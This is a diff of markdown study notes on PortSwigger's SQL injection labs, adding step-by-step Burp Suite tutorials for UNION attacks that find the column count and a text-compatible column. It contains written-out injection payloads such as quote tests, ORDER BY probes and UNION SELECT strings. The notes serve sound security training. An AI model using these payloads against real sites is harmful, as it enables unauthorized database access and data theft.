@@ -93,14 +93,14 @@ The modified query returns all items where either the `category` is `Gifts`, or 
 
 #### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 
-<details>
-<summary>Lab details, screenshots & walkthrough</summary>
-
 This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
 
 ```SQL
 SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 ```
+<details>
+<summary>Lab details, screenshots & walkthrough</summary>
+
 To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
 
 ![access lab 0.1](access-lab-0.1.png)
@@ -179,12 +179,12 @@ This query returns the user whose `username` is `administrator` and successfully
 
 #### Lab: SQL injection vulnerability allowing login bypass
 
+To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.
+
 <details>
 <summary>Lab details, screenshots & walkthrough</summary>
 
 This lab contains a SQL Injection vulnerability in the login function. 
-
-To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.
 
 ![access lab 0.2](access-lab-0.2.png)
 
@@ -297,10 +297,10 @@ As with the `ORDER BY` technique, the application might actually return the data
 
 ##### Lab: SQL injection UNION attack, determining the number of columns returned by the query
 
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsesquent labs to construct the full attack.
+
 <details>
 <summary>Lab details, screenshots & walkthrough</summary>
-
-This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsesquent labs to construct the full attack.
 
 To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.
 
@@ -330,31 +330,44 @@ To solve the lab, determine the number of columns returned by the query by perfo
 
 ![Success to UNION Attack determining the number columns by query 0.3](success-0.3.png)
 
-##### Tutorial
 
-1. Use Burp Suite to intercept the request with `category=Pets`, then send it to Repeater.
-2. Modify `Pets` to `'` and `'--` to check for SQL errors and compare the responses with the normal behavior.
-   SQL
-   ```
+### Tutorial
+
+1. **Intercept the Request**  
+   Use Burp Suite to intercept the request containing `category=Pets`, then send it to Repeater.
+2. **Test for SQL Injection**  
+   Modify the `category` parameter to check for SQL errors and compare the responses.
+
+   ```sql
    category='
    category='--
    ```
-3. Modify the `category` parameter using `ORDER BY` with values from `1` to `4`.
-   SQL
-   ```
+3. **Determine the Number of Columns**  
+   Use `ORDER BY` with increasing column numbers until an error occurs.
+
+   ```sql
    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--
    ' ORDER BY 4--
    ```
-4. When an `ORDER BY` value produces an error, determine the number of columns and test `UNION SELECT` with `NULL` values from `1` to `3`.
-   SQL
-   ```
+4. **Test UNION SELECT with NULL Values**  
+   Test different numbers of `NULL` values to determine the correct column count.
+
+   ```sql
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT NULL,NULL,NULL--
    ```
-5. Check whether the response returns HTTP 200 OK when using `NULL` values, and compare the response body with the normal response.
+5. **Test the Alternative NULL Representation**  
+   Test the alternative representation shown in the screenshots.
+
+   ```sql
+   ' UNION SELECT NULL,+NULL,+NULL--
+   ```
+6. **Verify the Response**  
+   Check for an HTTP `200 OK` response and compare the response body with the normal response to determine whether the UNION query is accepted.
+
 
 ##### Reference
 
@@ -390,9 +403,116 @@ The payloads described the double-dash comment sequence `--` to comment out the 
 >Notes: For more details of database-specific syntax, see the [SQL Injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
 ### Finding columns with a useful data type
+
+A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.
+
+After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:
+
+```SQL
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+```
+If the column data type is not compatible with string data, the injected query will cause a database error, such as:
+
+```SQL
+Conversion failed when converting the varchar value 'a' to data type int.
+```
+If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.
+
 ##### Lab: SQL injection UNION attack, finding a column containing text
 
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.
+
+<details>
+<summary>Lab details, screenshots & walkthrough</summary>
+
+The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.
+
+![access labs 0.4](access-lab-0.4.png)
+
+![Open Gifts parameter 0.4](Open-Gifts-parameter-0.4.png)
+
+![intercept and repeater 0.4](intercept-and-repeater-0.4.png)
+
+![error 0.4](error-0.4.png)
+
+![comment 0.4](comments-0.4.png)
+
+![ORDER BY 1 0.4](ORDER-BY-1-0.4.png)
+
+![ORDER BY 2 0.4](ORDER-BY-2-0.4.png)
+
+![ORDER BY 3 0.4](ORDER-BY-3-0.4.png)
+
+![Error in ORDER BY 4 0.4](Error-in-ORDER-BY-4-0.4.png)
+
+![Give UNION SELECT 1,2,3 and changes values NULL NULL NULL 0.4](change-NULL-0.4.png)
+
+![in respone success get information the database retrieve the string: 'AAAA'](response-success.png)
+
+##### Tutorial
+
+1. **Intercept the Request**  
+   Use Burp Suite to intercept the request containing `category=Gifts`, then send it to Repeater.
+2. **Test for SQL Injection**  
+   Modify the `category` parameter to check for SQL errors and compare the responses.
+
+   ```sql
+   category='
+   category='--
+   ```
+3. **Determine the Number of Columns**  
+   Use `ORDER BY` with increasing column numbers until an error occurs.
+
+   ```sql
+   ' ORDER BY 1--
+   ' ORDER BY 2--
+   ' ORDER BY 3--
+   ' ORDER BY 4--
+   ```
+4. **Test UNION SELECT**  
+   Since `ORDER BY 4` produces an error while `ORDER BY 3` succeeds, test a UNION query with three columns.
+
+   ```sql
+   ' UNION SELECT NULL,NULL,NULL--
+   ```
+5. **Identify the Displayed Column**  
+   Replace the `NULL` values with identifiable strings or numbers to determine which column is reflected in the response.
+
+   ```sql
+   ' UNION SELECT 1,2,3--
+   ```
+6. **Verify the Result**  
+   Check the response for HTTP `200 OK` and look for the reflected value, such as `AAAA`, in the response body. This confirms that the UNION query is being processed and identifies the displayed column.
+
+##### Reference
+
+<details>
+<summary>10. SQL Injection - Lab #4 SQL injection UNION attack, finding a column containing text — Rana Khalil</summary>
+
+Platform: YouTube
+Video: https://www.youtube.com/watch?v=SGBTC5D7DTs
+Purpose: This lab contains an SQL injection vulnerability in the product category filter. To solve the lab, we perform a SQL injection attack that returns an additional row containing the value provided. This technique helps us determine which columns are compatible with string data.
+
+</details>
+
+<details>
+<summary> 11. 
+SQL Union Attack - Finding a Column Containing Text — z3nsh3ll</summary>
+
+Platform: Youtube
+Video: https://www.youtube.com/watch?v=itECw0Yn8tQ
+Purpose: This lab was provided by the Burp Web Security Academy. We solve the challenge 'finding a column containing text'
+</details>
+
+</details>
+
 ### Using a SQL injection UNION attack to retrieve interesting data
+
+
+
 ##### Lab: SQL injection UNION attack, retrieving data from other tables
 
 ### Retrieving multiple values within a single column
